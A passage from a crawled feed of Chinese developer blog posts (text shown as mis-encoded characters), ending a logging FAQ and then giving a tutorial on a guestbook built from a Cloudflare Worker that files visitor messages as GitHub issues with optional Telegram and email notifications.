<li>æ£€æŸ¥æ—¶åŒºæ˜¯å¦æ­£ç¡®</li>
<li>ç¡®è®¤è¯¥è¯·æ±‚æ˜¯å¦çœŸçš„åˆ°è¾¾äº†æœåŠ¡</li>
</ul>
<p><strong>Q3: æ—¥å¿—ä¹±ç æ€ä¹ˆåŠï¼Ÿ</strong></p>
<ul>
<li>ç¡®ä¿ä½¿ç”¨ UTF-8 ç¼–ç </li>
<li>æ£€æŸ¥ Encoding é…ç½®</li>
<li>ä½¿ç”¨ <code>cat -A</code> æŸ¥çœ‹ç‰¹æ®Šå­—ç¬¦</li>
</ul>
<p><strong>Q4: å¦‚ä½•åœ¨ä»£ç ä¸­åŠ¨æ€ä¿®æ”¹æ—¥å¿—çº§åˆ«ï¼Ÿ</strong></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// è¿è¡Œæ—¶ä¿®æ”¹æ—¥å¿—çº§åˆ«ï¼ˆä¸æ¨èç”Ÿäº§ç¯å¢ƒï¼‰</span>
logx.SetLevel(logx.ErrorLevel)
</code></pre>
<p><strong>Q5: å®¹å™¨ç¯å¢ƒæ—¥å¿—å¦‚ä½•æ”¶é›†ï¼Ÿ</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># ä½¿ç”¨ volume æ¨¡å¼</span>
<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">volume</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">/var/log/app</span>

<span class="hljs-comment"># Docker æŒ‚è½½</span>
<span class="hljs-attr">volumes:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/var/log/app</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[cloudflare + github å®ç°ç•™è¨€æ¿]]></title>    <link>https://juejin.cn/post/7588461466599211059</link>    <guid>https://juejin.cn/post/7588461466599211059</guid>    <pubDate>2025-12-29T04:00:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588461466599211059" data-draft-id="7588695570635538470" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="cloudflare + github å®ç°ç•™è¨€æ¿"/> <meta itemprop="keywords" content="å‰ç«¯,GitHub"/> <meta itemprop="datePublished" content="2025-12-29T04:00:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ankkaya"/> <meta itemprop="url" content="https://juejin.cn/user/413072100168269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            cloudflare + github å®ç°ç•™è¨€æ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/413072100168269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ankkaya
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:00:29.000Z" title="Mon Dec 29 2025 04:00:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Â å°ç™½æœåŠ¡å™¨è¸©å‘ï¼ˆ1ï¼‰ä¸­ï¼Œæˆ‘ä»¬æˆåŠŸéƒ¨ç½²ç½‘ç«™ä¸Šçº¿ï¼Œç°åœ¨ä¸ºç½‘ç«™å®ç°ç•™è¨€æ¿åŠŸèƒ½</p>
<h2 data-id="heading-0">å®ç°åŸç†</h2>
<p>é‡‡ç”¨ Github Issues + CloudFlare Worker å®ç°ï¼Œåœ¨ Worder æ·»åŠ å‡½æ•°å®ç°ç•™è¨€å†…å®¹æ¥æ”¶ï¼Œå¹¶æäº¤è‡³ Github Issuesï¼ŒGithub Issues æ¥å­˜æ”¾ç•™è¨€æ•°æ®ï¼Œä¹Ÿæ–¹ä¾¿ç½‘ç«™æ˜¾ç¤ºç•™è¨€è®°å½•</p>
<p>è¿™æ ·åšçš„å¥½å¤„ä¸éœ€è¦æ•°æ®åº“ï¼Œä¹Ÿä¸éœ€è¦éƒ¨ç½²åå°æœåŠ¡ï¼ŒGithub Issues å®¡æ ¸ï¼Œåˆ†ç±»ï¼Œæ ‡ç­¾ä¹Ÿæ–¹ä¾¿ç®¡ç†ç•™è¨€</p>
<h2 data-id="heading-1">åˆ›å»º Worker</h2>
<p>Worker åªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå‰ç«¯è°ƒç”¨æ¥å£å®é™…æ˜¯æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè¿›å…¥Â cloudflareï¼Œé€‰æ‹©<code>è®¡ç®—æœºå’ŒAI/Workderså’ŒPages</code>åˆ›å»ºåº”ç”¨ç¨‹åºï¼Œé€‰æ‹©ä» Hello Worldï¼å¼€å§‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6be5fe0b26b04abc9e487fe4646d2152~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5ra2F5YQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585629&amp;x-signature=LUF%2B0FvuxDE2fnQAJqNtaxdJQQg%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥å…ˆéƒ¨ç½²ç¨‹åºï¼Œéƒ¨ç½²æˆåŠŸåä¿®æ”¹ç¨‹åºã€‚åœ¨ç¨‹åºè¯¦æƒ…é¡µé¢ï¼Œå³ä¸Šè§’ç‚¹å‡»<code>ç¼–è¾‘ä»£ç </code>ï¼Œæ·»åŠ æäº¤ç•™è¨€çš„ä»£ç </p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">corsHeadersÂ </span>=Â {
Â Â <span class="hljs-string">"Access-Control-Allow-Origin"</span>:Â <span class="hljs-string">"*"</span>,Â <span class="hljs-comment">//Â æœ¬åœ°Â +Â ç”Ÿäº§éƒ½èƒ½ç”¨</span>
Â Â <span class="hljs-string">"Access-Control-Allow-Methods"</span>:Â <span class="hljs-string">"POST,Â GET,Â OPTIONS"</span>,
Â Â <span class="hljs-string">"Access-Control-Allow-Headers"</span>:Â <span class="hljs-string">"Content-Type"</span>,
};

exportÂ <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_ invoke__">asyncÂ fetch</span>(request,Â env)Â {
Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-comment">//Â 1ï¸âƒ£Â å¤„ç†Â CORSÂ é¢„æ£€è¯·æ±‚</span>
Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(request.methodÂ ===Â <span class="hljs-string">"OPTIONS"</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(<span class="hljs-literal">null</span>,Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â status</span>:Â <span class="hljs-number">204</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â corsHeaders,
Â Â Â Â Â Â });
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-comment">//Â 2ï¸âƒ£Â GETï¼šå¥åº·æ£€æŸ¥</span>
Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(request.methodÂ ===Â <span class="hljs-string">"GET"</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(
Â Â Â Â Â Â Â Â JSON.<span class="hljs-title function_ invoke__">stringify</span>({
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â status</span>:Â <span class="hljs-string">"ok"</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â message</span>:Â <span class="hljs-string">"CommentÂ APIÂ isÂ running"</span>,
Â Â Â Â Â Â Â Â }),
Â Â Â Â Â Â Â Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â headers</span>:Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"application/json"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â ...corsHeaders,
Â Â Â Â Â Â Â Â Â Â },
Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â );
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-comment">//Â 3ï¸âƒ£Â åªå…è®¸Â POST</span>
Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(request.methodÂ !==Â <span class="hljs-string">"POST"</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(<span class="hljs-string">"MethodÂ NotÂ Allowed"</span>,Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â status</span>:Â <span class="hljs-number">405</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â corsHeaders,
Â Â Â Â Â Â });
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â <span class="hljs-comment">//Â 4ï¸âƒ£Â æ­£å¸¸å¤„ç†ç•™è¨€</span>
Â Â Â Â <span class="hljs-comment">//Â =========================</span>
Â Â Â Â letÂ data;
Â Â Â Â <span class="hljs-keyword">try</span>Â {
Â Â Â Â Â Â dataÂ =Â awaitÂ request.<span class="hljs-title function_ invoke__">json</span>();
Â Â Â Â }Â <span class="hljs-keyword">catch</span>Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(<span class="hljs-string">"InvalidÂ JSON"</span>,Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â status</span>:Â <span class="hljs-number">400</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â corsHeaders,
Â Â Â Â Â Â });
Â Â Â Â }

Â Â Â Â <span class="hljs-keyword">const</span>Â {Â contentÂ }Â =Â data;

Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(!content)Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(<span class="hljs-string">"ContentÂ isÂ required"</span>,Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â status</span>:Â <span class="hljs-number">400</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â corsHeaders,
Â Â Â Â Â Â });
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â -------------------------</span>
Â Â Â Â <span class="hljs-comment">//Â åˆ›å»ºÂ GitHubÂ Issue</span>
Â Â Â Â <span class="hljs-comment">//Â -------------------------</span>
Â Â Â Â <span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">issueBodyÂ </span>=Â content;

Â Â Â Â <span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">resÂ </span>=Â <span class="hljs-title function_ invoke__">awaitÂ fetch</span>(
Â Â Â Â Â Â `<span class="hljs-attr">https</span>://api.github.com/repos/${env.GITHUB_REPO}/issues`,
Â Â Â Â Â Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â method</span>:Â <span class="hljs-string">"POST"</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Authorization</span>:Â `BearerÂ ${env.GITHUB_TOKEN}`,
Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"application/json"</span>,
Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"User-Agent"</span>:Â <span class="hljs-string">"CF-Worker"</span>,
Â Â Â Â Â Â Â Â },
<span class="hljs-attr">Â Â Â Â Â Â Â Â body</span>:Â JSON.<span class="hljs-title function_ invoke__">stringify</span>({
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â title</span>:Â <span class="hljs-string">"ç”¨æˆ·ç•™è¨€"</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â body</span>:Â issueBody,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â labels</span>:Â [<span class="hljs-string">"pending"</span>],
Â Â Â Â Â Â Â Â }),
Â Â Â Â Â Â }
Â Â Â Â );

Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(!res.ok)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">errÂ </span>=Â awaitÂ res.<span class="hljs-title function_ invoke__">text</span>();
Â Â Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(err,Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â status</span>:Â <span class="hljs-number">500</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â corsHeaders,
Â Â Â Â Â Â });
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â -------------------------</span>
Â Â Â Â <span class="hljs-comment">//Â å‘é€é€šçŸ¥ï¼ˆTelegramÂ æˆ–é‚®ä»¶ï¼‰</span>
Â Â Â Â <span class="hljs-comment">//Â -------------------------</span>
Â Â Â Â <span class="hljs-keyword">try</span>Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â TelegramÂ æœºå™¨äººé€šçŸ¥</span>
Â Â Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(env.TELEGRAM_BOT_TOKENÂ &amp;&amp;Â env.TELEGRAM_CHAT_ID)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">telegramMessageÂ </span>=Â `ğŸ“Â æ–°ç•™è¨€\n\n${content}`;
Â Â Â Â Â Â Â Â <span class="hljs-title function_ invoke__">awaitÂ fetch</span>(
Â Â Â Â Â Â Â Â Â Â `<span class="hljs-attr">https</span>://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`,
Â Â Â Â Â Â Â Â Â Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â method</span>:Â <span class="hljs-string">"POST"</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â headers</span>:Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"application/json"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â },
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â body</span>:Â JSON.<span class="hljs-title function_ invoke__">stringify</span>({
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Â Â chat_id</span>:Â env.TELEGRAM_CHAT_ID,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Â Â text</span>:Â telegramMessage,
Â Â Â Â Â Â Â Â Â Â Â Â }),
Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â );
Â Â Â Â Â Â }

Â Â Â Â Â Â <span class="hljs-comment">//Â é‚®ä»¶é€šçŸ¥ï¼ˆä½¿ç”¨Â SendGridï¼‰</span>
Â Â Â Â Â Â <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__">Â </span>(env.SENDGRID_API_KEYÂ &amp;&amp;Â env.NOTIFICATION_EMAIL)Â {
Â Â Â Â Â Â Â Â <span class="hljs-title function_ invoke__">awaitÂ fetch</span>(<span class="hljs-string">"https://api.sendgrid.com/v3/mail/send"</span>,Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â method</span>:Â <span class="hljs-string">"POST"</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â headers</span>:Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Authorization</span>:Â `BearerÂ ${env.SENDGRID_API_KEY}`,
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"application/json"</span>,
Â Â Â Â Â Â Â Â Â Â },
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â body</span>:Â JSON.<span class="hljs-title function_ invoke__">stringify</span>({
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â personalizations</span>:Â [
Â Â Â Â Â Â Â Â Â Â Â Â Â Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â to</span>:Â [{<span class="hljs-attr">Â email</span>:Â env.NOTIFICATION_EMAILÂ }],
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â subject</span>:Â <span class="hljs-string">"æ–°ç•™è¨€é€šçŸ¥"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â },
Â Â Â Â Â Â Â Â Â Â Â Â ],
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â from</span>:Â {<span class="hljs-attr">Â email</span>:Â env.FROM_EMAILÂ ||Â env.NOTIFICATION_EMAILÂ },
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â content</span>:Â [
Â Â Â Â Â Â Â Â Â Â Â Â Â Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â type</span>:Â <span class="hljs-string">"text/plain"</span>,
<span class="hljs-attr">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â value</span>:Â content,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â },
Â Â Â Â Â Â Â Â Â Â Â Â ],
Â Â Â Â Â Â Â Â Â Â }),
Â Â Â Â Â Â Â Â });
Â Â Â Â Â Â }
Â Â Â Â }Â <span class="hljs-keyword">catch</span><span class="hljs-title function_ invoke__">Â </span>(notifyError)Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â é€šçŸ¥å¤±è´¥ä¸å½±å“ä¸»æµç¨‹ï¼Œåªè®°å½•é”™è¯¯</span>
Â Â Â Â Â Â console.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">"é€šçŸ¥å‘é€å¤±è´¥:"</span>,Â notifyError);
Â Â Â Â }

Â Â Â Â <span class="hljs-keyword">return</span><span class="hljs-title function_ invoke__">Â newÂ Response</span>(
Â Â Â Â Â Â JSON.<span class="hljs-title function_ invoke__">stringify</span>({<span class="hljs-attr">Â success</span>:Â <span class="hljs-literal">true</span>Â }),
Â Â Â Â Â Â {
<span class="hljs-attr">Â Â Â Â Â Â Â Â headers</span>:Â {
Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"application/json"</span>,
Â Â Â Â Â Â Â Â Â Â ...corsHeaders,
Â Â Â Â Â Â Â Â },
Â Â Â Â Â Â }
Â Â Â Â );
Â Â },
};
</code></pre>
<p>æœºå™¨äººå’Œé‚®ç®±é€šçŸ¥å¯é€‰ï¼Œå› ä¸ºè¦ç”¨æˆ‘ä»¬è‡ªå·±çš„ Github è´¦å·æäº¤ Issuesï¼Œè¿˜éœ€è¦åœ¨ Worker é‡Œé…ç½®å˜é‡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/502b34b82d30447dab78b597ee5bfac3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5ra2F5YQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585629&amp;x-signature=sHl7eEGz8HAciWF7ItB6Q1DB45Q%3D" alt="" loading="lazy"/></p>
<p><code>GITHUB_REPO</code>æ˜¯ä¿å­˜ Issues çš„é¡¹ç›®åï¼Œ<code>GITHUB_TOKEN</code>éœ€è¦åœ¨ github ç”Ÿæˆ token</p>
<h2 data-id="heading-2">Github Token</h2>
<p>ç™»å½• githubï¼Œæ‰“å¼€<code>Settings/Developer settings</code>ï¼Œé€‰æ‹©<code>Personal access tokens/Token(classic)</code>ï¼Œ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/297226895694455db99ccbf2e5ec39ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5ra2F5YQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585629&amp;x-signature=mjoXqBLGfb8WAHH9V2i3VJ6Gx6s%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»<code>Generate new token/Generate new token(classic)</code>ï¼Œå¡«å†™ token å¤‡æ³¨ï¼Œé€‰æ‹©æœ‰æ•ˆæ—¶é•¿ï¼Œä¸éœ€è¦å‹¾é€‰å…¶ä»–æƒé™ï¼Œåˆ›å»º tokenï¼Œå¤åˆ¶ token åˆ°ä¸Šä¸€æ­¥è®¾ç½®çš„<code>GITHUB_TOKEN</code>å˜é‡</p>
<h2 data-id="heading-3">å‰ç«¯æäº¤</h2>
<p>å‰ç«¯æ ¸å¿ƒå°±æ˜¯è°ƒç”¨ cloudflare åˆ›å»ºçš„ worker api åœ°å€</p>
<pre><code class="hljs language-php" lang="php">Â Â <span class="hljs-keyword">const</span>Â <span class="hljs-variable constant_">responseÂ </span>=Â <span class="hljs-title function_ invoke__">awaitÂ fetch</span>(<span class="hljs-string">"https://comment.staryou.workers.dev"</span>,Â {
<span class="hljs-attr">Â Â Â Â method</span>:Â <span class="hljs-string">"POST"</span>,
<span class="hljs-attr">Â Â Â Â headers</span>:Â {
Â Â Â Â Â Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"application/json"</span>,
Â Â Â Â },
<span class="hljs-attr">Â Â Â Â body</span>:Â JSON.<span class="hljs-title function_ invoke__">stringify</span>({
<span class="hljs-attr">Â Â Â Â Â Â content</span>:Â content,
Â Â Â Â }),
Â Â });
</code></pre>
<p>å‰ç«¯è°ƒç”¨ api æˆåŠŸï¼Œworker è·å–å‰ç«¯æäº¤ content å†…å®¹ï¼Œå°† issues çŠ¶æ€è®¾ä¸º pendingï¼ˆgithub è‡ªè¡Œè®¾å®šï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ issues çŠ¶æ€ï¼Œæ–¹ä¾¿å‰ç«¯ç­›é€‰ç•™è¨€</p>
<p>å‰ç«¯è°ƒç”¨ç•™è¨€ apiï¼Œè¿™æ ·å°±å®ç°äº†ç•™è¨€è¿‡æ»¤å’Œåˆ†é¡µæ˜¾ç¤º</p>
<pre><code class="hljs language-perl" lang="perl">https:<span class="hljs-regexp">//api</span>.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/issues?labels=approved&amp;<span class="hljs-keyword">state</span>=<span class="hljs-keyword">open</span>&amp;per_page=${ISSUES_PER_PAGE}&amp;page=${page}
</code></pre>
<h2 data-id="heading-4">å…¶ä»–</h2>
<p>worker ä¸­ä»“åº“åé…ç½®é”™è¯¯ï¼Œå‰ç«¯æ§åˆ¶å°æŠ¥é”™</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1a8831c9a294bdcabecab7d5a7f1b16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5ra2F5YQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585629&amp;x-signature=a90%2FL8IV3MwcFYw%2FWTBDJ9VdZZg%3D" alt="" loading="lazy"/></p>
<p>ç”Ÿæˆ github token æœ€å¥½é€‰æ‹© classicï¼Œé¿å…æƒé™é—®é¢˜</p>
